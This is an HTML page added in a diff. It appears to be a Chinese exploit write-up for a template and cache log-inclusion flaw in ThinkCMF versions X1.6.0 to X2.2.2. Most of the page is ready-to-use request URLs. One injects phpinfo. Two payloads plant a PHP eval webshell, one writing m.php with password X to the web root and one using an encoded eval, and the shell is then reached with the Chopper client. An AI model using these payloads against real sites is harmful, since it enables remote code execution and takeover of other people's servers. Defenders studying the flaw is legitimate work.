@@ -1,0 +1,48 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs1773D91F{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="thinkcmf-缓存getshell"><span class="csDE05BCC">ThinkCMF </span><span class="csECDA2D3">缓存</span><span class="csDE05BCC">Getshell</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">ThinkCMF X1.6.0<br/>ThinkCMF X2.1.0<br/>ThinkCMF X2.2.0<br/>ThinkCMF X2.2.1<br/>ThinkCMF X2.2.2</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="常规操作"><span class="csD6CA00D2">常规操作</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/index.php?a=display&amp;templateFile=README.md&amp;content=%3C?php%20phpinfo();die();</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/ThinkCMF%20%e7%bc%93%e5%ad%98Getshell_files/image0.png" width="560" height="240" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
+			<a name="利用缓存文件getshell"><span class="cs83F14626">利用缓存文件</span><span class="csB2D98684">getshell</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">由于</span><span class="cs8926E06">thinkcmf2.x</span><span class="cs9C1B1871">使用了</span><span class="cs8926E06">thinkphp3.x</span><span class="cs9C1B1871">作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码写入</span><span class="cs8926E06">data/runtime/Logs/Portal</span><span class="cs9C1B1871">目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马</span><span class="cs8926E06">m.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">日志文件格式为</span><span class="cs8926E06">YY_MM_DD.log</span><span class="cs9C1B1871">，如当前日期为</span><span class="cs8926E06">2019</span><span class="cs9C1B1871">年</span><span class="cs8926E06">12</span><span class="cs9C1B1871">月</span><span class="cs8926E06">12</span><span class="cs9C1B1871">日，日志文件为</span><span class="cs8926E06">19_12_12.log</span><span class="cs9C1B1871">，完整路径为</span></p><p class="cs3A447A38"><span class="cs9FB05234">data/runtime/Logs/Portal/19_12_12.log</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">payload </span><span class="csE3F655E4">一</span></p><ul style="margin-top:0;margin-bottom:0;">
+			<li class="cs1773D91F"><span class="cs9C1B1871">首先访问</span></li></ul>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E</span></p><ul style="margin-top:0;margin-bottom:0;">
+			<li class="cs1773D91F"><span class="cs9C1B1871">然后请求</span></li></ul>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log</span></p><ul style="margin-top:0;margin-bottom:0;">
+			<li class="cs1773D91F"><span class="cs9C1B1871">即可在</span><span class="cs8926E06">http://www.0-sec.org/</span><span class="cs9C1B1871">根目录生成</span><span class="cs8926E06">m.php</span><span class="cs9C1B1871">，密码是</span><span class="cs8926E06">X</span></li></ul>
+		<p class="cs40DD2BC9"><span class="cs5BEC2C28">payload </span><span class="csE3F655E4">二</span></p><ul style="margin-top:0;margin-bottom:0;">
+			<li class="cs1773D91F"><span class="cs9C1B1871">首先访问</span></li></ul>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/?a=display&amp;templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E</span></p><ul style="margin-top:0;margin-bottom:0;">
+			<li class="cs1773D91F"><span class="cs9C1B1871">然后菜刀链接（密码也是</span><span class="cs8926E06">x</span><span class="cs9C1B1871">）</span></li></ul>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log</span></p></body>
+</html>
